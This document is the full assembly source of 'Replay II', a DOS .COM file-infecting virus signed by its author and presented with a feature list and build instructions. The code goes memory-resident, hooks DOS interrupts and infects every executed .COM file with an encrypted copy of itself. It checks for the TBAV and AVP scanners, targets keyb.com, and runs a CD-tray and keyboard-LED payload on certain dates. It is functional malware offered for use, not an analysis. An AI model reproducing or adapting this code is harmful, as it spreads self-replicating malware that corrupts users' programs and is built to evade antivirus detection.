
title                              Replay II

comment #.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s

Skillz / Modificationz :

- new memory alloc strategy (not in UMBs, but below TOM)
- no more SFTs (pb w/ winsuxx ... once again)
- rewritten, more optimized, more readable
- same infection on end of exec, all real .coms
- random marker picked from ROM
- payload if month+day = 20 : open cd door while flashing keyboard leds.
- try to infect c:\windows\command\keyb.com at install time
- no intentional destructiv code :)
- undetectable by f-prot/tbav/mcafee/avp/drweb/nodice/... (ram/file) at 11/98

compile using tasm /m3 and tlink /t .



                                        - mandragore Ä÷î


greetz to all vxer in da world!

s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s.s$s #



.model tiny
.code
.386
bptr    equ <byte ptr>
wptr    equ <word ptr>
dptr    equ <dword ptr>
%out replay II - by mandragore
virsiz  equ eov-vir

        org 100h

Start:  jmp vir
        db 'o'

;---------------------------------  init
        
vir:    xor ax,ax
        int 15h                 ;  screw up most of the heuristics scannerz
        jnc vir
        pop si
        push si                 ;  mov si,0

;------------------------------  decryptor

dcrypt: xor wptr [si+boc],''
        org $-4
adrboc  dw boc
ckey1   dw 0
        inc si
        cmp si,virsiz-dcryptsz-1
        jnz dcrypt
dcryptsz equ $-vir

;---------------------  enough for shit, let's play :)
;
; (after this point, everything is xored in infected filez)
;

boc:    mov bp,''             ;  delta
        org $-2
delta   dw 0

        mov ah,30h
        mov bx,'MD'
        int 21h                 ;  install check
        cmp bx,'RG'
        jz back

;----------------------------  install in RAM

        mov ax,3d00h
        lea dx,tbsig+bp
        int 21h         ;  TBAV ?
        jnc back

        cmp wptr ds:[0ah],3f5ch         ;  AVPTSR ?
        je back

        mov ax,ds
        dec ax
        mov ds,ax
        mov si,12h
        mov ax,[si]
        sub ax,(virsiz+cryptsz)/16+2            ;  decrease TOM
        mov [si],ax
        sub wptr ds:[''],(virsiz+cryptsz)/16+2 ;  and free RAM
        xor si,si
        mov dl,'M'
        xchg [si],dl
        mov ds,ax
        mov [si],dl
        inc si
        mov wptr [si],8                         ;  chain MCB
        mov wptr [si+2],(virsiz+cryptsz)/16+1

        inc ax
        mov es,ax
        push cs
        pop ds
        xor di,di
        lea si,bp+vir
        mov cx,virsiz/2
        rep movsw                       ;  go in ram

        pop ds
        push ds
        shl eax,16
        mov ax,hooker-vir
        xchg eax,ds:[84h]               ;  chain int 21h
        mov es:[org21h-vir],eax
        mov es:[int21-vir],eax

        jmp payload

tbsig   db 'TBDRVXXX',0         ;  present if any TBAV tsr

;-----------------------------  hooker (21+22)

hooker:
        pushf
        cmp ah,30h
        jne chk                 ;  install check
        cmp bx,'MD'
        jne chk                 
        mov bx,'RG'
        popf
        iret
chk:    push ax
        xor ah,4bh              ;  avoid mem scan
        pop ax
        jnz back21
        mov cs:[seg_-vir],ds
        mov cs:[off_-vir],dx    ;  save path pointer
        push cs
        push new22-vir          ;  hook int 22h
        pushf
back21: popf
        db 0eah
org21h  db ''

sig     db '//³à¤ëç†æíçä',0,'[replay II]',0     ;  AVs won't call replay
oldbeg  db 0c3h,''                           ;      //³à¤ëç†.xxx
newbeg  db 0e9h,''
marker  db ''                  ;  i love you
csig    db 7 dup('')

crypt:  xor wptr [si],''
        org $-2
ckey2   db ''                 ;  crypt in RAM
        inc si
        cmp si,virsiz-1
        jb crypt
tcrypt  equ $-crypt
        mov ah,40h
        cwd                     ;  and write crypted to the file
        mov cx,virsiz
        pushf
        db 9ah                  ;  call far cuz our hooker iz crypted
int21   db ''
        mov bptr ds:[eov-vir+tcrypt],0c3h   ;  mov ^,ret
;  don't drink and code ... you see what happens :)
        mov si,dcryptsz
        jmp crypt               ; decrypt the RAM and ret ^
cryptsz equ $-crypt

;---------------------------  after execution

new22:  pusha
        push ds es
        pushf
        pop ax
        mov bp,sp
        mov [bp+18h],ax         ;  update flagz to ret
        mov ax,''
        org $-2
seg_    db ''
        mov ds,ax
        mov dx,''
        org $-2
off_    dw ''
        call infct
pb:     pop es ds
        popa
        iret                    ;  real back to EXEC caller

;---------------------------  infection rutine

infct:
        mov ax,3d02h
        int 21h                 ;  open r/w
        jc iend                 ;  and fuck goes to +r

        xchg ax,bx
        push cs
        pop ds
        mov ah,3fh
        mov dx,oldbeg-vir
        mov si,dx
        mov cx,4                ;  read header
        int 21h

        call get_id             ;  get infection marker
        cmp bptr [si+''],al    ;  already infected ?
        je ileav
        mov cx,'MZ'
        cmp [si],cx             ;  already infected by Mark Zbikowski ? :)
        je ileav
        xchg ch,cl
        cmp [si],cx             ;       "        "     Zbikowski Mark ?
        je ileav

        mov al,2
        call lseek              ;  get file size

        mov cx,ax
        add cx,virsiz           ;  too big to fit in a .com?
        jc ileav
        sub ax,''              ;  calc new jmp for target
        mov ds:[newbeg+1-vir],ax
        dec ax
        mov ds:[delta-vir],ax   ;  prepare delta offset
        add ax,offset boc
        mov ds:[adrboc-vir],ax  ;  and update decryptor

        sub ax,offset boc+''
        mov dx,4200h
        xor cx,cx
        xchg ax,dx
        int 21h                 ;  lseek to eof - 7
        
        mov ah,3fh
        mov dx,csig-vir         ;  read 4 later
        mov cx,7
        int 21h

        call get_id
        mov ds:[marker-vir],al  ;  change marker of infection

        in ax,40h
        mov ds:[ckey1-vir],ax   ;  get random crypt key from timer
        mov ds:[ckey2-vir],ax

        mov si,crypt-vir
        mov di,eov-vir
        mov cx,cryptsz
        push ds
        pop es
        rep movsb               ;  install cryptor...

        mov si,dcryptsz         ;  start crypt after decryptor
        call eov                ;  crypt/write/decrypt/ret from outside

        mov si,csig-vir+''
        cmp wptr [si],'SN'      ;  w95/98 self check .com ?
        jne nwbeg
        add wptr [si+2],virsiz+7  ;  update sig
        mov ah,40h
        mov cx,7
        mov dx,csig-vir
        int 21h                 ;  and write it at eof

nwbeg:  xor ax,ax
        call lseek              ;  go to bof
        mov ah,40h
        mov dx,newbeg-vir       ;  write new jmp at bof
        mov cx,4
        int 21h

ileav:  mov ah,3eh
        int 21h
iend:   ret

get_id: push ds
        mov ax,0f000h
        mov ds,ax
        mov al,ds:[0ceh]        ;  pick our marker from machine'z ROM
        pop ds
        ret

lseek:  mov ah,42h
        cwd
        xor cx,cx               ;  get file size
        int 21h
        ret

;--------------------------------  payload

payload:
        mov ah,4
        int 1ah
        add dl,dh
        cmp dl,20               ;  day+month=20?
        jne ikeyb

        mov wptr [ourseg+bp],cs
        lea si,datas+bp
        mov [bp+adrdata],si     ;  inits
        pop ds
        push ds                 ;  ds=0
        mov si,417h

        call crazy_cd           ;  cd open
        mov bptr [si],40h
        mov ah,1                ;  led 2
        int 16h                                 ;  int 16 is used here to
        call crazy_cd           ;  cd close     ;  give the time to update
        mov bptr [si],10h                       ;  the leds to the comp.
        mov ah,1                ;  led 3
        int 16h
        call crazy_cd           ;  cd open
        mov bptr [si],20h
        mov ah,1                ;  led 1
        int 16h
        call crazy_cd           ;  cd close
        jmp ikeyb

crazy_cd:
        xor bptr cs:[datas+bp],5
        mov ax,1500h
        xor bx,bx
        int 2fh         ;  get cdrom drive numbah
        or bx,bx
        je nocd
        mov al,10h
        lea bx,cdcmd+bp
        int 2fh         ;  send datas
nocd:   ret

cdcmd   db 1ah,0,0Ch,0,0,0,0,0,0,0,0,0,0,0
adrdata dw datas
ourseg  db ''
datas   db 5
keyb    db 'c:\windows\command\keyb.com',0

ikeyb:  push cs cs
        pop ds es
        lea dx,bp+keyb
        mov ah,4bh
        int 21h                 ;  don't exec but infect :)

;-----------------------------  back to host

back:   mov si,100h
        push si
        mov eax,dptr [bp+oldbeg]
        mov [si],eax       ;  restore host
        xor eax,eax
        push eax
        push eax
        push eax                ;  peace and
        push eax
        popa                    
        ret                     ;  leave :)
        db '(c) mandragre[FS]'
eov:

end start
